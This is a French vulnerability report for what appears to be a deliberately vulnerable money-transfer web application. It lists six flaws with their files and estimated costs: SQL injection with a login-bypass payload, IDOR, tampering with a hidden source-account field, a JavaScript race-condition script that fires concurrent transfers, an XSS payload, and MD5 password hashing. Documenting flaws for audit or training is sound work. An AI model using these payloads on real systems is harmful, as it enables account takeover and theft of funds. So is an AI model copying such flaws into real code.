# Documentation des Vulnérabilités - Version 1

## 1. Injection SQL (Critique)
**Localisation :** `core/Auth.php`, méthode `login()`
**Impact :** Accès non autorisé aux comptes, vol de données
**Exploitation :**
```
Username: admin' OR '1'='1' --
Password: anything
```
**Coût estimé :**
- Amendes RGPD : jusqu'à 4% du CA
- Perte de confiance client : -30% de revenus
- Coûts légaux : 500k€ - 2M€

## 2. IDOR - Accès non autorisé aux données (Élevé)
**Localisation :** `api/wallet/balance.php`
**Impact :** Vol d'informations financières
**Exploitation :**
```
GET /api/wallet/balance.php?user_id=4
```
**Coût estimé :**
- Violation de confidentialité : 50€ - 500€ par client impacté
- Amendes : 10M€ ou 2% du CA

## 3. Manipulation du compte source (Critique)
**Localisation :** `api/transfer/send.php`
**Impact :** Vol direct d'argent
**Exploitation :**
```
Modifier le champ caché `from_user_id` dans le formulaire
```
**Coût estimé :**
- Pertes directes : illimitées
- Fermeture possible de la plateforme

## 4. Race Condition (Élevé)
**Localisation :** `core/Transfer.php`
**Impact :** Création d'argent fictif
**Script d'exploitation :**
```javascript
// Envoyer 5 transferts simultanés du même montant
const promises = [];
for (let i = 0; i < 5; i++) {
    const formData = new FormData();
    formData.append('to_user_id', '2');
    formData.append('amount', 1000);
    promises.push(fetch('../api/transfer/send.php', {
        method: 'POST',
        body: formData
    }));
}
Promise.all(promises).then(results => {
    console.log('Transferts simultanés envoyés:', results.length);
});
```
**Coût estimé :**
- Pertes : potentiellement illimitées
- Insolvabilité de la plateforme

## 5. XSS - Cross-Site Scripting (Moyen)
**Localisation :** `public/dashboard.php`, affichage des descriptions
**Impact :** Vol de sessions, phishing
**Exploitation :**
```
Description de transfert : <script>alert('XSS')</script>
```

## 6. Mots de passe faibles (Élevé)
**Localisation :** `core/Auth.php`, utilisation de MD5
**Impact :** Compromission des comptes
**Coût estimé :**
- Coût de notification : 1€ - 5€ par client
- Réinitialisation des mots de passe : coûts opérationnels élevés
